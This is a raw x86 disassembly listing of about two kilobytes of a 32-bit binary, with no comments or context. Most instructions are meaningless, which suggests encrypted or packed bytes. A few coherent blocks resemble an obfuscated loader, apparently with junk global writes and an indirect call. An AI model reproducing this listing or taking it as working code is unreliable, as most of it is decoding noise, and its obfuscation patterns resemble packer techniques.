  402023:	sbb    DWORD PTR [edi-0x2e],ecx
  402026:	ficom  DWORD PTR [edx]
  402028:	inc    ebx
  402029:	jl     0x402010
  40202b:	sbb    al,0x42
  40202d:	mov    ds,WORD PTR [ecx-0x49]
  402030:	xchg   ebx,eax
  402031:	loope  0x402037
  402033:	jmp    0x401fe1
  402035:	inc    ecx
  402036:	cdq    
  402037:	push   ds
  402038:	mov    WORD PTR gs:[edx],fs
  40203b:	pop    es
  40203c:	rcr    BYTE PTR [ecx+0x1842e401],1
  402042:	mov    WORD PTR [edx],?
  402044:	mov    WORD PTR [ebx+0x61bf7bb7],?
  40204a:	cmp    DWORD PTR [edx],ebx
  40204c:	out    dx,eax
  40204d:	pop    ebp
  40204e:	jg     0x402098
  402050:	nop
  402051:	mov    ds:0x9fb8efd9,al
  402056:	ins    DWORD PTR es:[edi],dx
  402057:	mov    edx,0xa5e8fc20
  40205c:	in     al,0x9f
  40205e:	ins    DWORD PTR es:[edi],dx
  40205f:	leave  
  402060:	jl     0x402056
  402062:	scas   eax,DWORD PTR es:[edi]
  402063:	retf   0xc33b
  402066:	ret    0x4662
  402069:	or     BYTE PTR [ebx],dl
  40206b:	es nop
  40206d:	aam    0x3f
  40206f:	lds    eax,FWORD PTR [ebx+ecx*4]
  402072:	push   ebp
  402073:	loopne 0x40203c
  402075:	inc    ebp
  402076:	aam    0xb9
  402078:	dec    esi
  402079:	add    BYTE PTR [eax],al
  40207b:	mov    DWORD PTR ds:0x42ee24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e75a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e762,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi-0x32d97d60],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x402085
  4020cf:	cmp    DWORD PTR [edi],ebx
  4020d1:	fiadd  WORD PTR [esi+0x34]
  4020d4:	cli    
  4020d5:	jns    0x402138
  4020d7:	xchg   DWORD PTR [eax+0x65],esp
  4020da:	inc    ebp
  4020db:	push   esi
  4020dc:	dec    esp
  4020dd:	mov    BYTE PTR [edi-0x8],al
  4020e0:	adc    BYTE PTR [ecx+0x12],cl
  4020e3:	adc    dh,BYTE PTR [edx+0x5]
  4020e6:	push   0x317432ed
  4020eb:	fadd   QWORD PTR [edi-0x1324ae96]
  4020f1:	mov    bl,0x85
  4020f3:	dec    ebp
  4020f4:	mov    dh,0x61
  4020f6:	adc    al,0x10
  4020f8:	int    0xad
  4020fa:	ret    
  4020fb:	nop
  4020fc:	pop    eax
  4020fd:	pop    esp
  4020fe:	data16 arpl WORD PTR [edi-0x1002927c],sp
  402105:	ds dec edx
  402107:	mov    bl,0xe1
  402109:	adc    al,0xe4
  40210b:	mov    edi,0xa9ca8b5e
  402110:	inc    edi
  402111:	jb     0x4020dc
  402113:	dec    ecx
  402114:	imul   ebx,DWORD PTR [edi-0x3e47b92b],0x20
  40211b:	test   eax,0x5cbf1de
  402120:	sbb    dh,BYTE PTR [ebx-0x41ca965b]
  402126:	retf   
  402127:	xchg   edx,eax
  402128:	mov    dl,0x20
  40212a:	ret    
  40212b:	push   esi
  40212c:	ja     0x4020fb
  40212e:	xchg   ebp,eax
  40212f:	retf   
  402130:	in     al,dx
  402131:	jno    0x402118
  402133:	das    
  402134:	icebp  
  402135:	out    dx,al
  402136:	call   0xd928:0x4d60c7fb
  40213d:	push   ebx
  40213e:	lahf   
  40213f:	mov    cl,ch
  402141:	imul   eax,DWORD PTR [ebx+0x10845ba9],0xffffff8f
  402148:	xchg   edi,eax
  402149:	scas   al,BYTE PTR es:[edi]
  40214a:	add    al,0xea
  40214c:	nop
  40214d:	int    0x36
  40214f:	or     al,0x5d
  402151:	xchg   BYTE PTR ds:0x6a326663,ch
  402157:	or     ah,bl
  402159:	push   0x981ddbf0
  40215e:	sub    DWORD PTR [ecx+0x2920d60d],ebp
  402164:	mov    bh,0x30
  402166:	mov    ah,0xa0
  402168:	sar    BYTE PTR [eax-0x34b2b39d],0x8
  40216f:	mov    esp,0x6ab1e941
  402174:	mov    ah,0xd7
  402176:	adc    DWORD PTR [edx],eax
  402178:	pop    esi
  402179:	pop    ebp
  40217a:	shr    BYTE PTR [ecx],cl
  40217c:	push   edi
  40217d:	jg     0x402154
  40217f:	fwait
  402180:	xor    dh,ch
  402182:	gs icebp 
  402184:	cmp    al,0xd1
  402186:	enter  0xeb3f,0x3e
  40218a:	sar    DWORD PTR ds:0x317c2a5d,1
  402190:	(bad)  
  402191:	xchg   esp,eax
  402192:	retf   0x8e17
  402195:	inc    ecx
  402196:	call   0xff34:0x3e21f65
  40219d:	jns    0x40215b
  40219f:	sub    eax,0x3ab6c50a
  4021a4:	dec    ebx
  4021a5:	mov    bl,0xfb
  4021a7:	dec    eax
  4021a8:	jmp    0xc4e2:0x8301221c
  4021af:	call   0x9b214793
  4021b4:	mov    ch,BYTE PTR [esi+0x5f]
  4021b7:	jae    0x40214e
  4021b9:	or     al,0x70
  4021bb:	sahf   
  4021bc:	push   0x2b
  4021be:	mov    dl,0xbc
  4021c0:	jmp    FWORD PTR ds:0x7b7e5e74
  4021c6:	mov    al,0x74
  4021c8:	and    eax,0x41f45f32
  4021cd:	or     BYTE PTR [esi-0x4f],0x32
  4021d1:	xchg   edx,eax
  4021d2:	cs jne 0x40215b
  4021d5:	add    al,0xf4
  4021d7:	pop    esi
  4021d8:	inc    edx
  4021d9:	lods   al,BYTE PTR ds:[esi]
  4021da:	and    edi,DWORD PTR [ecx-0x5bbeadba]
  4021e0:	lock inc ecx
  4021e2:	mov    WORD PTR [ecx-0x48ca0c5a],?
  4021e8:	sub    al,0xd8
  4021ea:	fadd   st(5),st
  4021ec:	sub    cl,BYTE PTR [esi+0x11]
  4021ef:	cmp    DWORD PTR [esi+0xc],ebp
  4021f2:	out    dx,eax
  4021f3:	fistp  DWORD PTR [ebp-0x21]
  4021f6:	addr16 int3 
  4021f8:	imul   ecx,ecx,0x6e
  4021fb:	pop    es
  4021fc:	push   ecx
  4021fd:	shr    bl,1
  4021ff:	retf   0x8a48
  402202:	and    BYTE PTR ss:[eax+eax*8+0x421addcd],0x28
  40220b:	ficom  WORD PTR [esi]
  40220d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40220e:	inc    ebp
  40220f:	sahf   
  402210:	inc    esp
  402211:	cdq    
  402212:	mov    ecx,0xf8cd4cd
  402217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402218:	aad    0x2
  40221a:	mov    ebp,0x6569ed83
  40221f:	sti    
  402220:	hlt    
  402221:	push   0xffffff9a
  402223:	sub    al,BYTE PTR [esi+0xfe8bf14]
  402229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40222a:	xor    DWORD PTR [esi+0x7e3d77fe],esi
  402230:	in     al,dx
  402231:	sub    BYTE PTR [esi+ebp*8-0x6939ce72],dh
  402238:	inc    eax
  402239:	mov    dh,0x37
  40223b:	push   edi
  40223c:	test   BYTE PTR [ebp+ecx*2-0x6e],dh
  402240:	ds stos DWORD PTR es:[edi],eax
  402242:	pushf  
  402243:	jb     0x40225a
  402245:	(bad)  
  402246:	xor    ecx,edx
  402248:	outs   dx,DWORD PTR ds:[esi]
  402249:	push   0x960784c6
  40224e:	call   0xf58f:0x90aab7d1
  402255:	sub    al,0xa5
  402257:	inc    edi
  402258:	push   edx
  402259:	les    eax,FWORD PTR [ebp+0x93853f3]
  40225f:	(bad)  
  402260:	jl     0x4022b9
  402262:	int3   
  402263:	hlt    
  402264:	xchg   edi,eax
  402265:	jnp    0x402225
  402267:	mov    ah,0xa3
  402269:	push   cs
  40226a:	xchg   ebp,eax
  40226b:	scas   al,BYTE PTR es:[edi]
  40226c:	mov    DWORD PTR [eax-0x7f],ebp
  40226f:	inc    ebx
  402270:	dec    esp
  402271:	adc    eax,0xf56e4905
  402276:	inc    esp
  402277:	pop    esp
  402278:	adc    edx,DWORD PTR [eax]
  40227a:	mov    edi,0x43f73657
  40227f:	fwait
  402280:	push   ebx
  402281:	add    bh,BYTE PTR [edx-0x4858a5f4]
  402287:	mov    al,ds:0xa3e1e1d3
  40228c:	fist   WORD PTR [esi-0xc]
  40228f:	es popa 
  402291:	(bad)
  402294:	sbb    BYTE PTR [edi+eiz*2],dh
  402297:	sbb    eax,0x9861ca73
  40229c:	cmp    edi,ebp
  40229e:	adc    ebp,ecx
  4022a0:	mov    ch,0x27
  4022a2:	rol    BYTE PTR [ecx-0x7970f8df],0x5a
  4022a9:	mov    WORD PTR [esi],ds
  4022ab:	jo     0x4022e6
  4022ad:	inc    edi
  4022ae:	adc    BYTE PTR [ecx+0x4f8b6f70],0xa6
  4022b5:	mov    ecx,DWORD PTR [ecx+eiz*4]
  4022b8:	mov    bh,0xa8
  4022ba:	aas    
  4022bb:	cli    
  4022bc:	pop    ds
  4022bd:	and    edi,esi
  4022bf:	fldz   
  4022c1:	pop    es
  4022c2:	push   ss
  4022c3:	into   
  4022c4:	adc    BYTE PTR [edi+0x3b],0x50
  4022c8:	or     ah,dh
  4022ca:	sub    al,0xf6
  4022cc:	sbb    DWORD PTR [ebx+ebx*8-0x14],ecx
  4022d0:	test   BYTE PTR [edi+0x730dd8ed],dl
  4022d6:	shl    BYTE PTR [ecx],1
  4022d8:	xchg   ebx,eax
  4022d9:	sbb    eax,esp
  4022db:	jge    0x4022bc
  4022dd:	jo     0x402325
  4022df:	rcr    DWORD PTR [esi],1
  4022e1:	and    eax,esi
  4022e3:	sbb    eax,0x9f907bc2
  4022e8:	bound  ecx,QWORD PTR [edx+0x293fb4f]
  4022ee:	dec    esi
  4022ef:	out    0x1c,eax
  4022f1:	sbb    al,0x81
  4022f3:	in     al,dx
  4022f4:	pop    es
  4022f5:	push   0x6af4602c
  4022fa:	test   esp,edi
  4022fc:	mov    dl,0x97
  4022fe:	out    dx,eax
  4022ff:	xor    BYTE PTR [eax-0x42],ch
  402302:	ss in  al,0x3d
  402305:	data16 cmp dh,ah
  402308:	jne    0x40231b
  40230a:	jmp    0x9ae1:0x549687e
  402311:	or     al,0xf1
  402313:	in     eax,dx
  402314:	ins    BYTE PTR es:[edi],dx
  402315:	lahf   
  402316:	mov    ecx,0xcf448421
  40231b:	mov    bl,0x53
  40231d:	pop    esp
  40231e:	sub    al,0xf6
  402320:	pop    es
  402321:	(bad)  
  402322:	jl     0x4022e1
  402324:	mov    cl,BYTE PTR [edx-0x36fd4b44]
  40232a:	loope  0x40232e
  40232c:	out    0x6,al
  40232e:	inc    edx
  40232f:	pop    esp
  402330:	mov    eax,0xde95a4bc
  402335:	xor    eax,0x8d399eb3
  40233a:	in     al,0x14
  40233c:	cmp    al,0xe1
  40233e:	xchg   esp,eax
  40233f:	mov    ebp,0x7a0da70a
  402344:	sub    eax,0xed6482d3
  402349:	mov    WORD PTR [ebx+0x77737d9e],fs
  40234f:	jno    0x4022d8
  402351:	or     al,0x8c
  402353:	dec    eax
  402354:	jp     0x4022ea
  402356:	xchg   edi,eax
  402357:	shl    dh,0x23
  40235a:	adc    edx,DWORD PTR [ebx-0x29]
  40235d:	pop    ss
  40235e:	dec    esp
  40235f:	call   0xd0de1dd6
  402364:	jo     0x4023ca
  402366:	jb     0x4023c1
  402368:	jae    0x4023df
  40236a:	push   ebx
  40236b:	push   edi
  40236c:	lods   eax,DWORD PTR ds:[esi]
  40236d:	adc    eax,eax
  40236f:	(bad)  
  402370:	xor    BYTE PTR [ecx],dh
  402372:	dec    edx
  402373:	jmp    0x40237a
  402375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402376:	push   esp
  402377:	sub    BYTE PTR [ebp-0x10],dh
  40237a:	neg    ebp
  40237c:	and    eax,0xeaa39618
  402381:	clc    
  402382:	imul   eax,edx,0x27
  402385:	sbb    al,0x14
  402387:	jmp    0xde3eee3a
  40238c:	xchg   edi,eax
  40238d:	or     DWORD PTR [eax+esi*8],edi
  402390:	push   ds
  402391:	dec    edx
  402392:	retf   0x5b46
  402395:	pop    eax
  402396:	gs push es
  402398:	into   
  402399:	stc    
  40239a:	int3   
  40239b:	jb     0x4023dc
  40239d:	cwde   
  40239e:	pop    ebp
  40239f:	fiadd  WORD PTR [ebx]
  4023a1:	mov    bl,0xa1
  4023a3:	dec    edi
  4023a4:	in     eax,0x5b
  4023a6:	int3   
  4023a7:	xor    DWORD PTR [edi+0x1fdf3446],eax
  4023ad:	mov    ebp,0xc823518e
  4023b2:	adc    eax,0xa9fc6bd2
  4023b7:	push   es
  4023b8:	xchg   edi,eax
  4023b9:	stos   DWORD PTR es:[edi],eax
  4023ba:	ror    BYTE PTR [esp+ebp*8],1
  4023bd:	add    al,BYTE PTR [edx]
  4023bf:	fnstsw ax
  4023c1:	test   eax,0x6a705ba
  4023c6:	cli    
  4023c7:	int    0x65
  4023c9:	in     al,0xb9
  4023cb:	mov    ecx,0xa7cdc09c
  4023d0:	pop    ss
  4023d1:	jns    0x40237f
  4023d3:	or     BYTE PTR [ebp-0x68],0x8
  4023d7:	xor    BYTE PTR [edi],cl
  4023d9:	jl     0x4023ca
  4023db:	push   0xd5c95a6a
  4023e0:	xchg   edx,eax
  4023e1:	repnz out 0xf2,al
  4023e4:	dec    esp
  4023e5:	and    ch,BYTE PTR [edi]
  4023e7:	shr    dl,0x47
  4023ea:	inc    esi
  4023eb:	inc    esi
  4023ec:	ss xor eax,0xefb1b35b
  4023f2:	jmp    0x9c9b:0xefd184a7
  4023f9:	mov    edx,0x1a627027
  4023fe:	inc    ecx
  4023ff:	dec    eax
  402400:	xchg   ecx,eax
  402401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402402:	mov    eax,ds:0xf8dbf9e8
  402407:	jmp    0x4023ba
  402409:	jg     0x40244e
  40240b:	adc    eax,0x5a9899a6
  402410:	sahf   
  402411:	rcr    BYTE PTR [edx],0xb
  402414:	out    0x7b,al
  402416:	cmp    eax,0x66f82b35
  40241b:	and    ecx,DWORD PTR [ebp-0x1]
  40241e:	mov    esp,0xc351f06d
  402423:	xchg   ebp,eax
  402424:	cmp    BYTE PTR [ecx+ecx*8+0xe],dh
  402428:	push   ss
  402429:	inc    ebx
  40242a:	push   ds
  40242b:	dec    edi
  40242c:	das    
  40242d:	pop    esi
  40242e:	out    dx,al
  40242f:	lahf   
  402430:	xor    BYTE PTR [edi-0x3e8850d6],cl
  402436:	rcr    DWORD PTR ds:0x994b8998,1
  40243c:	mov    ds:0x2fcdc34b,al
  402441:	sbb    al,BYTE PTR [edx-0x20]
  402444:	add    al,0x4
  402446:	out    0x14,al
  402448:	sar    bh,cl
  40244a:	jmp    0xec24:0xcc9f8b4
  402451:	in     eax,0x8b
  402453:	push   ss
  402454:	cmp    DWORD PTR [ecx],ecx
  402456:	bound  si,DWORD PTR [esi]
  402459:	addr16 jle 0x40240e
  40245c:	ja     0x402465
  40245e:	int3   
  40245f:	fistp  DWORD PTR [edx+0x1c]
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x430546,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4304be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4304ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	pop    es
  4024b3:	push   es
  4024b4:	adc    bh,dh
  4024b6:	push   edx
  4024b7:	movd   DWORD PTR [esi-0x7e],mm7
  4024bb:	jno    0x40253b
  4024bd:	jle    0x402514
  4024bf:	adc    DWORD PTR [esi],0xffffffe4
  4024c2:	mov    DWORD PTR ds:0xa3513688,esp
  4024c8:	mov    dh,0x87
  4024ca:	push   0xa53cd915
  4024cf:	pop    ecx
  4024d0:	(bad)  
  4024d1:	retf   0x920b
  4024d4:	xlat   BYTE PTR ds:[ebx]
  4024d5:	int3   
  4024d6:	(bad)  
  4024d8:	out    dx,al
  4024d9:	cmp    ch,ah
  4024db:	dec    ebp
  4024dc:	stc    
  4024dd:	cmp    BYTE PTR [eax+0x59],dh
  4024e0:	enter  0x1eed,0x76
  4024e4:	scas   eax,DWORD PTR es:[edi]
  4024e5:	xlat   BYTE PTR ds:[ebx]
  4024e6:	pmaxub mm2,QWORD PTR [ebp+0x2e]
  4024ea:	lea    esp,[ebx-0x42805661]
  4024f0:	inc    ebp
  4024f1:	or     DWORD PTR [ebp+0x7afd40e9],0x439bdc1f
  4024fb:	inc    ebp
  4024fc:	ds pop eax
  4024fe:	pusha  
  4024ff:	ins    DWORD PTR es:[edi],dx
  402500:	pusha  
  402501:	mov    ebp,0x9c4379c6
  402506:	es xchg ecx,eax
  402508:	stos   DWORD PTR es:[edi],eax
  402509:	jb     0x402496
  40250b:	xor    al,0x3d
  40250d:	and    eax,0xfae26dc7
  402512:	dec    edi
  402513:	cwde   
  402514:	or     esi,DWORD PTR [ecx]
  402516:	jb     0x40250f
  402518:	or     al,BYTE PTR [ebx+0x2365a5c3]
  40251e:	jmp    0xf2c4:0x7342acb1
  402525:	adc    DWORD PTR [edi+esi*2-0x43ca2697],eax
  40252c:	or     BYTE PTR [ebp-0x15],ah
  40252f:	cli    
  402530:	dec    esp
  402531:	gs popf 
  402533:	push   esi
  402534:	js     0x402591
  402536:	mov    eax,ds:0x96c79e84
  40253b:	in     eax,dx
  40253c:	data16 or al,0xa2
  40253f:	cmp    ah,BYTE PTR [ebp-0x17fb5395]
  402545:	mov    esi,0xb9c4a54d
  40254a:	or     BYTE PTR [eax],cl
  40254c:	in     al,0xe8
  40254e:	es mov edx,0x859be7a
  402554:	mov    esp,ebp
  402556:	lea    ebp,[ecx]
  402558:	push   es
  402559:	fild   WORD PTR [eax-0x2a0fbd18]
  40255f:	push   esp
  402560:	or     eax,0x4179e964
  402565:	lea    edx,[esi-0x4c]
  402568:	mov    BYTE PTR [edi],al
  40256a:	jle    0x402531
  40256c:	jle    0x402572
  40256e:	test   BYTE PTR cs:[ebx+0x12dfbe3f],ah
  402575:	xor    eax,0x87f3f93b
  40257a:	stc    
  40257b:	jl     0x40254d
  40257d:	(bad)  
  40257e:	pop    ebx
  40257f:	inc    ecx
  402580:	enter  0x1893,0xad
  402584:	shl    ecx,0x65
  402587:	mov    ecx,edi
  402589:	loope  0x4025f7
  40258b:	adc    eax,0x1989866d
  402590:	mov    bl,0xaa
  402592:	sbb    DWORD PTR [ecx],esi
  402594:	call   0x2e444b0c
  402599:	mov    ebp,0xa072c9e8
  40259e:	jo     0x402528
  4025a0:	jns    0x402584
  4025a2:	lahf   
  4025a3:	sub    eax,0x2dd871a2
  4025a8:	stc    
  4025a9:	in     eax,0xc3
  4025ab:	sub    al,BYTE PTR cs:[ebp+0x3e]
  4025af:	sbb    al,0xc8
  4025b1:	pushf  
  4025b2:	in     al,dx
  4025b3:	inc    ebp
  4025b4:	lods   al,BYTE PTR ds:[esi]
  4025b5:	mov    ah,0x8f
  4025b7:	shrd   DWORD PTR [ebx],ebx,0xf
  4025bb:	push   0xffffffb4
  4025bd:	adc    ch,dh
  4025bf:	push   ss
  4025c0:	jae    0x4025ae
  4025c2:	jns    0x40258d
  4025c4:	push   edx
  4025c5:	push   eax
  4025c6:	jne    0x4025cb
  4025c8:	dec    esp
  4025c9:	and    DWORD PTR [edx-0x77],esp
  4025cc:	mov    ecx,DWORD PTR [edx-0x1d6145c0]
  4025d2:	imul   BYTE PTR [eax+ecx*4]
  4025d5:	jmp    0xf066:0x66f3172b
  4025dc:	es repnz sbb al,0x2d
  4025e0:	jle    0x4025ce
  4025e2:	push   ebx
  4025e3:	mov    al,0xc3
  4025e5:	push   cs
  4025e6:	arpl   WORD PTR [ecx-0x630c3372],sp
  4025ec:	ds ja  0x402664
  4025ef:	fsubr  QWORD PTR [edi+ebp*2]
  4025f2:	inc    ebx
  4025f3:	mov    cl,0x2f
  4025f5:	dec    edx
  4025f6:	loopne 0x40266f
  4025f8:	fld    QWORD PTR [edi+0x19]
  4025fb:	test   eax,0x5fddfdd5
  402600:	mov    bh,0x90
  402602:	sub    ebp,DWORD PTR [ecx+eiz*8]
  402605:	or     al,0xe3
  402607:	pop    esi
  402608:	push   edx
  402609:	pop    edi
  40260a:	pop    ds
  40260b:	bound  esi,QWORD PTR [edi]
  40260d:	fincstp 
  40260f:	bound  ebx,QWORD PTR ds:0xa567312d
  402615:	sub    dl,BYTE PTR [edi-0x3b]
  402618:	xlat   BYTE PTR ds:[ebx]
  402619:	nop
  40261a:	inc    ebp
  40261b:	repz cmc 
  40261d:	xor    eax,0x87a3da6a
  402622:	lea    edi,[eax-0x3bfaf500]
  402628:	or     bl,0xa8
  40262b:	dec    eax
  40262c:	jmp    0x87ca2e47
  402631:	rcr    BYTE PTR [edx-0x745ff535],cl
  402637:	das    
  402638:	fdiv   DWORD PTR [edi-0x6c0625ac]
  40263e:	pop    eax
  40263f:	stc    
  402640:	enter  0x23a2,0xf5
  402644:	jmp    0x4025e8
  402646:	retf   
  402647:	mov    bl,BYTE PTR [edx-0x2f]
  40264a:	gs call 0xfb9b:0x96a9721b
  402652:	pushf  
  402653:	sub    BYTE PTR es:[esi+ebx*2],0xa
  402658:	das    
  402659:	out    dx,al
  40265a:	and    dl,BYTE PTR [eax+0x4e]
  40265d:	xor    DWORD PTR [ebp+ebx*4+0x36],0xfffffffe
  402662:	data16 (bad) 
  402664:	fldcw  WORD PTR [ebx+0x2b4f41e2]
  40266a:	push   esp
  40266b:	inc    ebp
  40266c:	sub    cl,bl
  40266e:	push   ebp
  40266f:	fimul  WORD PTR [edi-0x44]
  402672:	push   esi
  402673:	iret   
  402674:	test   eax,0x66df79bf
  402679:	out    0xa7,al
  40267b:	xchg   esp,eax
  40267c:	jbe    0x40269a
  40267e:	sub    edx,DWORD PTR [edi+edx*4+0x768c7758]
  402685:	push   ecx
  402686:	rcr    DWORD PTR [edx-0x177d1471],1
  40268c:	jecxz  0x4026f6
  40268e:	and    eax,0x2fd8dbb9
  402693:	mov    BYTE PTR [edi-0x27],al
  402696:	mul    BYTE PTR [ebx+0x71d519a5]
  40269c:	cs daa 
  40269e:	cmc    
  40269f:	in     eax,dx
  4026a0:	ret    0xcc46
  4026a3:	fist   DWORD PTR [esi]
  4026a5:	add    eax,0x9f9418f2
  4026aa:	sub    al,0xea
  4026ac:	and    bh,BYTE PTR [ebx]
  4026ae:	push   eax
  4026af:	or     al,BYTE PTR [ecx+0x7f4d001e]
  4026b5:	ss adc al,0x99
  4026b8:	jb     0x4026f3
  4026ba:	or     DWORD PTR [ecx-0x5ec10b76],esi
  4026c0:	jmp    0x8742:0x9115de86
  4026c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c8:	cmc    
  4026c9:	pop    ebp
  4026ca:	xor    eax,0xa45cb95b
  4026cf:	jmp    0xf707:0x9d14bf4a
  4026d6:	push   ss
  4026d7:	inc    ecx
  4026d8:	and    BYTE PTR [ebp+eiz*8-0x25cfb60d],bh
  4026df:	mov    ah,BYTE PTR [ebx]
  4026e1:	js     0x402693
  4026e3:	lahf   
  4026e4:	test   al,0x95
  4026e6:	in     al,0x4f
  4026e8:	mov    ebx,DWORD PTR [ebx+0x37e60c36]
  4026ee:	mov    esi,0xdce315c8
  4026f3:	clc    
  4026f4:	inc    esi
  4026f5:	mov    ch,0xb9
  4026f7:	(bad)  
  4026f8:	mov    ch,0x3
  4026fa:	test   BYTE PTR [ebx+ebx*1-0x49],dl
  4026fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ff:	pop    edi
  402700:	dec    eax
  402701:	fsubrp st(4),st
  402703:	dec    esi
  402704:	xor    BYTE PTR [ecx+0x5abdfc23],cl
  40270a:	sub    eax,0xf656dc9f
  40270f:	dec    esp
  402710:	inc    ecx
  402711:	cmp    ebp,DWORD PTR [edx-0x4f]
  402714:	icebp  
  402715:	push   cs
  402716:	fld    TBYTE PTR [esi+eax*1+0x69d56bce]
  40271d:	push   esp
  40271e:	inc    ebp
  40271f:	and    dh,BYTE PTR [eax+0x21]
  402722:	fld    TBYTE PTR [ecx*2+0x7b858306]
  402729:	mov    cl,0x1d
  40272b:	fld    TBYTE PTR [edx-0x7efa5262]
  402731:	and    eax,0x366fb03
  402736:	xchg   edi,eax
  402737:	inc    edx
  402738:	pop    es
  402739:	arpl   WORD PTR ds:0xcaf48b10,bx
  40273f:	pop    eax
  402740:	mov    bh,0x22
  402742:	fidivr WORD PTR [edi]
  402744:	ins    DWORD PTR es:[edi],dx
  402745:	not    bl
  402747:	inc    ebp
  402748:	idiv   DWORD PTR gs:[ebp-0x44848b2c]
  40274f:	push   es
  402750:	loop   0x4027b2
  402752:	jae    0x402766
  402754:	dec    edi
  402755:	aas    
  402756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402757:	stos   BYTE PTR es:[edi],al
  402758:	std    
  402759:	leave  
  40275a:	test   al,0x7e
  40275c:	(bad)
  40275f:	into   
  402760:	xchg   ebp,eax
  402761:	scas   eax,DWORD PTR es:[edi]
  402762:	pop    ebp
  402763:	mov    esp,edx
  402765:	ja     0x402704
  402767:	je     0x402743
  402769:	push   edi
  40276a:	lods   eax,DWORD PTR ds:[esi]
  40276b:	jl     0x4027de
  40276d:	(bad)  
  40276e:	loopne 0x402732
  402770:	mov    BYTE PTR [edx],bl
  402772:	inc    ebp
  402773:	pand   mm1,QWORD PTR [edi-0x6e]
  402777:	int    0xfd
  402779:	pop    edx
  40277a:	leave  
  40277b:	inc    esp
  40277c:	test   DWORD PTR ds:0x164e7c2b,edi
  402782:	push   ecx
  402783:	push   ss
  402784:	imul   edx,edi,0xffffff9c
  402787:	xchg   edx,eax
  402788:	push   ebp
  402789:	mov    cs,edi
  40278b:	je     0x40274e
  40278d:	xor    al,0xc4
  40278f:	aaa    
  402790:	addr16 and ebx,ebx
  402793:	mov    al,ds:0xe05177e1
  402798:	mov    edi,0xa0f4382
  40279d:	mov    BYTE PTR [edi+0x3f356300],al
  4027a3:	(bad)  
  4027a4:	fidiv  WORD PTR ds:0xc5ce99e
  4027aa:	outs   dx,DWORD PTR ds:[esi]
  4027ab:	sbb    al,0xb9
  4027ad:	jae    0x4027d4
  4027af:	add    eax,0xd8436661
  4027b4:	adc    ebp,DWORD PTR [ebx+0x21de185b]
  4027ba:	or     ah,BYTE PTR [eax-0x5ff8d2c3]
  4027c0:	and    ecx,ebp
  4027c2:	push   es
  4027c3:	xor    eax,0x17059adc
  4027c8:	push   ecx
  4027c9:	pop    es
  4027ca:	in     al,0x60
  4027cc:	push   esp
  4027cd:	mov    dl,0x0
  4027cf:	cmp    eax,0xf0689763
  4027d4:	fld    DWORD PTR [ebx]
  4027d6:	arpl   WORD PTR [ecx+ecx*8],sp
  4027d9:	int3   
  4027da:	jb     0x40285a
  4027dc:	sub    al,0xac
  4027de:	test   eax,0x3f604892
  4027e3:	pop    ds
  4027e4:	push   0xffffffc1
  4027e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027e7:	mov    edi,0xb69a158d
  4027ec:	mov    bl,BYTE PTR ds:0x9a22a565
  4027f2:	push   eax
  4027f3:	cwde   
  4027f4:	sub    al,0x21
  4027f6:	scas   eax,DWORD PTR es:[edi]
  4027f7:	out    dx,al
  4027f8:	mov    dx,0x1bc6
  4027fc:	in     eax,0x7b
  4027fe:	mov    WORD PTR [ebx-0x41ea1ec],ds
  402804:	shl    BYTE PTR [esi-0x19],0x9d
  402808:	test   ch,bl
  40280a:	jae    0x4027ff
  40280c:	(bad)  
  40280d:	retf   
  40280e:	loop   0x40283d
  402810:	push   edx
  402811:	call   0x1e2a:0x73738780
  402818:	lea    edx,ds:0x31f78757
  40281e:	lds    ecx,FWORD PTR [eax+0x2]
  402821:	clc    
  402822:	dec    eax
  402823:	add    eax,0x9db762ce
  402828:	lock cdq 
  40282a:	leave  
  40282b:	and    eax,0x46cf365f
  402830:	enter  0x2c2a,0x58
  402834:	pop    edx
  402835:	div    BYTE PTR [ebx]
  402837:	sub    eax,0xf00953f6
  40283c:	mov    eax,0x4f7ca060
  402841:	xchg   edi,eax
  402842:	pop    ss
  402843:	in     al,dx
  402844:	mov    BYTE PTR [edi-0x5f3c0bab],dh
  40284a:	aam    0x13
  40284c:	adc    al,0x4e
  40284e:	sub    bh,BYTE PTR [ebp+0x76]
  402851:	fwait
  402852:	or     DWORD PTR [eax],0x60751c9e
  402858:	mov    DWORD PTR ds:0x42e75e,0x14
  402862:	cmp    DWORD PTR ds:0x42e75e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e75e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42e9d8
